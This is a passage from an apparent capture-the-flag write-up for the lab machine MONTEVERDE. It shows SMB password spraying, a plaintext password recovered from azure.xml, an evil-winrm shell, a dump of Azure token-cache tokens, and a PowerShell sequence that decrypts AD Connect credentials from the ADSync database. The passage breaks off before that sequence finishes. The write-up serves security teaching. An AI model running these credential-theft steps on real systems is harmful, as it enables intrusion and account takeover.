<span class="code-line">[*] KTHXBYE!</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\roleary:roleary STATUS_LOGON_FAILURE</span>
<span class="code-line">[*] KTHXBYE!</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\smorgan:smorgan STATUS_LOGON_FAILURE</span>
<span class="code-line">[*] KTHXBYE!</span>
<span class="code-line"></code></pre></div>

<h2 id="smb-as-sabatchjobs">SMB as SABatchJobs</h2>
<p>We connect to the <code>Users$</code> share with our SABatchJobs account. The first user
folder is empty and the second one give us an other account: mhope.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># smbclient //10.10.10.172/Users$ -U &quot;SABatchJobs&quot;%&quot;SABatchJobs&quot;</span>
<span class="code-line">Try &quot;help&quot; to get a list of possible commands.</span>
<span class="code-line">smb: \&gt; dir</span>
<span class="code-line">  .                                   D        0  Fri Jan  3 08:12:48 2020</span>
<span class="code-line">  ..                                  D        0  Fri Jan  3 08:12:48 2020</span>
<span class="code-line">  dgalanos                            D        0  Fri Jan  3 08:12:30 2020</span>
<span class="code-line">  mhope                               D        0  Fri Jan  3 08:41:18 2020</span>
<span class="code-line">  roleary                             D        0  Fri Jan  3 08:10:30 2020</span>
<span class="code-line">  smorgan                             D        0  Fri Jan  3 08:10:24 2020</span>
<span class="code-line"></span>
<span class="code-line">    524031 blocks of size 4096. 518419 blocks available</span>
<span class="code-line">smb: \&gt; cd mhope\</span>
<span class="code-line">smb: \mhope\&gt; ls</span>
<span class="code-line">  .                                   D        0  Fri Jan  3 08:41:18 2020</span>
<span class="code-line">  ..                                  D        0  Fri Jan  3 08:41:18 2020</span>
<span class="code-line">  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020</span>
<span class="code-line"></span>
<span class="code-line">    524031 blocks of size 4096. 518419 blocks available</span>
<span class="code-line">smb: \mhope\&gt; mget azure.xml</span>
<span class="code-line">Get file azure.xml? y</span>
<span class="code-line">getting file \mhope\azure.xml of size 1212 as azure.xml (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)</span>
<span class="code-line"></span>
<span class="code-line">��&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span>
<span class="code-line">  &lt;Obj RefId=&quot;0&quot;&gt;</span>
<span class="code-line">    &lt;TN RefId=&quot;0&quot;&gt;</span>
<span class="code-line">      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;</span>
<span class="code-line">      &lt;T&gt;System.Object&lt;/T&gt;</span>
<span class="code-line">    &lt;/TN&gt;</span>
<span class="code-line">    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;</span>
<span class="code-line">    &lt;Props&gt;</span>
<span class="code-line">      &lt;DT N=&quot;StartDate&quot;&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;</span>
<span class="code-line">      &lt;DT N=&quot;EndDate&quot;&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;</span>
<span class="code-line">      &lt;G N=&quot;KeyId&quot;&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;</span>
<span class="code-line">      &lt;S N=&quot;Password&quot;&gt;4n0therD4y@n0th3r$&lt;/S&gt;</span>
<span class="code-line">    &lt;/Props&gt;</span>
<span class="code-line">  &lt;/Obj&gt;</span>
<span class="code-line">&lt;/Objs&gt;</span>
<span class="code-line"></code></pre></div>

<h2 id="evil-winrm">evil-winrm</h2>
<p>We use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to connect to the
box with our new account. We quickly find the user's flag on the Desktop.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># ruby evil-winrm.rb -u mhope -i 10.10.10.172 -p &#39;4n0therD4y@n0th3r$&#39;</span>
<span class="code-line"></span>
<span class="code-line">Evil-WinRM shell v1.8</span>
<span class="code-line"></span>
<span class="code-line">Info: Establishing connection to remote endpoint</span>
<span class="code-line"></span>
<span class="code-line">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; cat ../Desktop/user.txt</span>
<span class="code-line">4961976bd7d8f4eeb2ce3705e2f212f2</span>
<span class="code-line"></code></pre></div>

<h1 id="getting-root">Getting root</h1>
<h2 id="azure">Azure</h2>
<p>While enumerating more we found some <code>.Azure</code> file containg a few information
about the Azure configuration</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; ls</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">    Directory: C:\Users\mhope\.Azure</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">Mode                LastWriteTime         Length Name</span>
<span class="code-line">----                -------------         ------ ----</span>
<span class="code-line">d-----         1/3/2020   5:35 AM                ErrorRecords</span>
<span class="code-line">-a----         1/3/2020   5:31 AM             34 AzurePSDataCollectionProfile.json</span>
<span class="code-line">-a----         1/3/2020   5:35 AM           2794 AzureRmContext.json</span>
<span class="code-line">-a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json</span>
<span class="code-line">-a----         1/3/2020   5:36 AM           7896 TokenCache.dat</span>
<span class="code-line"></span>
<span class="code-line">*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; cat AzurePSDataCollectionProfile.json</span>
<span class="code-line">{&quot;enableAzureDataCollection&quot;:true}</span>
<span class="code-line">*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; cat AzureRmContext.json</span>
<span class="code-line">{</span>
<span class="code-line">  &quot;DefaultContextKey&quot;: &quot;372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com&quot;,</span>
<span class="code-line">  &quot;EnvironmentTable&quot;: {},</span>
<span class="code-line">  &quot;Contexts&quot;: {</span>
<span class="code-line">    &quot;372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com&quot;: {</span>
<span class="code-line">      &quot;Account&quot;: {</span>
<span class="code-line">        &quot;Id&quot;: &quot;john@a67632354763outlook.onmicrosoft.com&quot;,</span>
<span class="code-line">        &quot;Credential&quot;: null,</span>
<span class="code-line">        &quot;Type&quot;: &quot;User&quot;,</span>
<span class="code-line">        &quot;TenantMap&quot;: {},</span>
<span class="code-line">        &quot;ExtendedProperties&quot;: {</span>
<span class="code-line">          &quot;Tenants&quot;: &quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;</span>
<span class="code-line">        }</span>
<span class="code-line">      },</span>
<span class="code-line">      &quot;Tenant&quot;: {</span>
<span class="code-line">        &quot;Id&quot;: &quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;,</span>
<span class="code-line">        &quot;Directory&quot;: null,</span>
<span class="code-line">        &quot;ExtendedProperties&quot;: {}</span>
<span class="code-line">      },</span>
<span class="code-line">      &quot;Subscription&quot;: null,</span>
<span class="code-line">      &quot;Environment&quot;: {</span>
<span class="code-line">        &quot;Name&quot;: &quot;AzureCloud&quot;,</span>
<span class="code-line">        &quot;OnPremise&quot;: false,</span>
<span class="code-line">        &quot;ServiceManagementUrl&quot;: &quot;https://management.core.windows.net/&quot;,</span>
<span class="code-line">        &quot;ResourceManagerUrl&quot;: &quot;https://management.azure.com/&quot;,</span>
<span class="code-line">        &quot;ManagementPortalUrl&quot;: &quot;https://go.microsoft.com/fwlink/?LinkId=254433&quot;,</span>
<span class="code-line">        &quot;PublishSettingsFileUrl&quot;: &quot;https://go.microsoft.com/fwlink/?LinkID=301775&quot;,</span>
<span class="code-line">        &quot;ActiveDirectoryAuthority&quot;: &quot;https://login.microsoftonline.com/&quot;,</span>
<span class="code-line">        &quot;GalleryUrl&quot;: &quot;https://gallery.azure.com/&quot;,</span>
<span class="code-line">        &quot;GraphUrl&quot;: &quot;https://graph.windows.net/&quot;,</span>
<span class="code-line">        &quot;ActiveDirectoryServiceEndpointResourceId&quot;: &quot;https://management.core.windows.net/&quot;,</span>
<span class="code-line">        &quot;StorageEndpointSuffix&quot;: &quot;core.windows.net&quot;,</span>
<span class="code-line">        &quot;SqlDatabaseDnsSuffix&quot;: &quot;.database.windows.net&quot;,</span>
<span class="code-line">        &quot;TrafficManagerDnsSuffix&quot;: &quot;trafficmanager.net&quot;,</span>
<span class="code-line">        &quot;AzureKeyVaultDnsSuffix&quot;: &quot;vault.azure.net&quot;,</span>
<span class="code-line">        &quot;AzureKeyVaultServiceEndpointResourceId&quot;: &quot;https://vault.azure.net&quot;,</span>
<span class="code-line">        &quot;GraphEndpointResourceId&quot;: &quot;https://graph.windows.net/&quot;,</span>
<span class="code-line">        &quot;DataLakeEndpointResourceId&quot;: &quot;https://datalake.azure.net/&quot;,</span>
<span class="code-line">        &quot;BatchEndpointResourceId&quot;: &quot;https://batch.core.windows.net/&quot;,</span>
<span class="code-line">        &quot;AzureDataLakeAnalyticsCatalogAndJobEndpointSuffix&quot;: &quot;azuredatalakeanalytics.net&quot;,</span>
<span class="code-line">        &quot;AzureDataLakeStoreFileSystemEndpointSuffix&quot;: &quot;azuredatalakestore.net&quot;,</span>
<span class="code-line">        &quot;AdTenant&quot;: &quot;Common&quot;,</span>
<span class="code-line">        &quot;VersionProfiles&quot;: [],</span>
<span class="code-line">        &quot;ExtendedProperties&quot;: {</span>
<span class="code-line">          &quot;OperationalInsightsEndpoint&quot;: &quot;https://api.loganalytics.io/v1&quot;,</span>
<span class="code-line">          &quot;OperationalInsightsEndpointResourceId&quot;: &quot;https://api.loganalytics.io&quot;,</span>
<span class="code-line">          &quot;AzureAnalysisServicesEndpointSuffix&quot;: &quot;asazure.windows.net&quot;,</span>
<span class="code-line">          &quot;AnalysisServicesEndpointResourceId&quot;: &quot;https://region.asazure.windows.net&quot;,</span>
<span class="code-line">          &quot;AzureAttestationServiceEndpointSuffix&quot;: &quot;attest.azure.net&quot;,</span>
<span class="code-line">          &quot;AzureAttestationServiceEndpointResourceId&quot;: &quot;https://attest.azure.net&quot;</span>
<span class="code-line">        }</span>
<span class="code-line">      },</span>
<span class="code-line">      &quot;VersionProfile&quot;: null,</span>
<span class="code-line">      &quot;TokenCache&quot;: {</span>
<span class="code-line">        &quot;CacheData&quot;: null</span>
<span class="code-line">      },</span>
<span class="code-line">      &quot;ExtendedProperties&quot;: {}</span>
<span class="code-line">    }</span>
<span class="code-line">  },</span>
<span class="code-line">  &quot;ExtendedProperties&quot;: {}</span>
<span class="code-line">}</span>
<span class="code-line">*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; cat AzureRmContextSettings.json</span>
<span class="code-line">{&quot;Mode&quot;:&quot;CurrentUser&quot;,&quot;ContextDirectory&quot;:&quot;C:\\Users\\mhope\\.Azure&quot;,&quot;ContextFile&quot;:&quot;AzureRmContext.json&quot;,&quot;CacheDirectory&quot;:&quot;C:\\Users\\mhope\\.Azure&quot;,&quot;CacheFile&quot;:&quot;TokenCache.dat&quot;,&quot;Settings&quot;:{}}</span>
<span class="code-line">*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; cat TokenCache.dat</span>
<span class="code-line">‡https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://graph.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0©{&quot;RefreshToken&quot;:&quot;AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA&quot;,&quot;ResourceInResponse&quot;:&quot;https:\/\/graph.windows.net\/&quot;,&quot;Result&quot;:{&quot;AccessToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNpbYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA&quot;,&quot;AccessTokenType&quot;:&quot;Bearer&quot;,&quot;ExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062173584)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062173584)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedLifeTimeToken&quot;:false,&quot;IdToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4Mjc2LCJuYmYiOjE1NzgwNTgyNzYsImV4cCI6MTU3ODA2MjE3NiwiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.&quot;,&quot;TenantId&quot;:&quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;,&quot;UserInfo&quot;:{&quot;DisplayableId&quot;:&quot;john@a67632354763outlook.onmicrosoft.com&quot;,&quot;FamilyName&quot;:&quot;Clark&quot;,&quot;GivenName&quot;:&quot;John&quot;,&quot;IdentityProvider&quot;:&quot;https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/&quot;,&quot;PasswordChangeUrl&quot;:null,&quot;PasswordExpiresOn&quot;:null,&quot;UniqueId&quot;:&quot;e4f56bc1-021f-4795-bca2-bedfc819e90a&quot;}},&quot;UserAssertionHash&quot;:null}‘https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://management.core.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0‡{&quot;RefreshToken&quot;:&quot;AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA&quot;,&quot;ResourceInResponse&quot;:&quot;https:\/\/management.core.windows.net\/&quot;,&quot;Result&quot;:{&quot;AccessToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYWNyIjoiMSIsImFpbyI6IjQyVmdZSGc3ajlGN3oxK24renhKZktXQmpxcWRYMzFEVDNLc2ovL2FzT1d5VFcycTNRSUEiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZmFtaWx5X25hbWUiOiJDbGFyayIsImdpdmVuX25hbWUiOiJKb2huIiwiZ3JvdXBzIjpbImM3OTRlNzE3LTIxZWYtNDljZS1hZjAwLTljMDEwZGM0MWE3NiJdLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoid1U4Y1RtUm5tTzM2Z1E5MEx4VUNiN0tGMXZ3NlVUVlVKa1VPNThJd3NVTSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiI4MjNlVzFyWmZFQ1hEV2lHaHQ1UkFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyI2MmU5MDM5NC02OWY1LTQyMzctOTE5MC0wMTIxNzcxNDVlMTAiXX0.ja68GQ9Suvm8-6a732DZy7Z7Q62XnmL0hsVnMKP3L-u7KB9W8nafebCzEmwhAoAzEqVOKfApM8VjOALGJcgz60sYbN0JtK4RaHCiF0yQogGTvgFe3FMB-26wCxGo-d_hTxiPiFUGfTuqSMzprXfBEKLneXNKcLlkav2pPNAhLD_HoshDaznMPlt2W00rq6hJII032WoZQMPYMLJmnub4pi2N3ScroWO3zDQ16wpoFCOSYbuqoLKSm-FLN8yEhTJDf2umcOaLVE7jtnHba_rEPyC_sBtIedl1nSR8kr7A9B8dBvn0pC3M7gYIVpVwIana6pni6I8jaMwH_-3aJmCLhw&quot;,&quot;AccessTokenType&quot;:&quot;Bearer&quot;,&quot;ExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062154521)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062154521)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedLifeTimeToken&quot;:false,&quot;IdToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.&quot;,&quot;TenantId&quot;:&quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;,&quot;UserInfo&quot;:{&quot;DisplayableId&quot;:&quot;john@a67632354763outlook.onmicrosoft.com&quot;,&quot;FamilyName&quot;:&quot;Clark&quot;,&quot;GivenName&quot;:&quot;John&quot;,&quot;IdentityProvider&quot;:&quot;https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/&quot;,&quot;PasswordChangeUrl&quot;:null,&quot;PasswordExpiresOn&quot;:null,&quot;UniqueId&quot;:&quot;e4f56bc1-021f-4795-bca2-bedfc819e90a&quot;}},&quot;UserAssertionHash&quot;:null}</span>
<span class="code-line"></code></pre></div>

<h2 id="password-hash-synchronisation">Password Hash Synchronisation</h2>
<p>A few goolge search lead us to this article about
<a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">Azure AD Connect for Red Teamers</a>.</p>
<p>We try the POC in the article on our box but the first line seems wrong as we
get an error when we try to connect to the local DB. The trick is to use
<code>trusted_connection</code> and to have the <code>Data source</code> set to <code>.</code>.</p>
<p>Then we easily retrive the administrator password.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>*Evil-WinRM* PS C:&gt; $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source=.;Initial Catalog=ADSync;trusted_connection=true;&quot;</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $client.Open()</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $cmd = $client.CreateCommand()</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $cmd.CommandText = &quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $reader = $cmd.ExecuteReader()</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $reader.Read() | Out-Null</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $key_id = $reader.GetInt32(0)</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $instance_id = $reader.GetGuid(1)</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $entropy = $reader.GetGuid(2)</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $reader.Close()</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $cmd = $client.CreateCommand()</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $cmd.CommandText = &quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&quot;</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $reader = $cmd.ExecuteReader()</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $reader.Read() | Out-Null</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $config = $reader.GetString(0)</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $crypted = $reader.GetString(1)</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $reader.Close()</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; add-type -path &#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll’</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $km.LoadKeySet($entropy, $instance_id, $key_id)</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $key = $null</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $km.GetActiveCredentialKey([ref]$key)</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $key2 = $null</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $km.GetKey(1, [ref]$key2)</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $decrypted = $null</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $key2.DecryptBase64ToString($crypted, [ref]$decrypted)</span>
<span class="code-line">*Evil-WinRM* PS C:&gt; $domain = select-xml -Content $config -XPath &quot;//parameter[@name=&#39;forest-login-domain&#39;]&quot; | select @{Name = &#39;Domain&#39;; Expression = {$_.node.InnerXML}}</span>
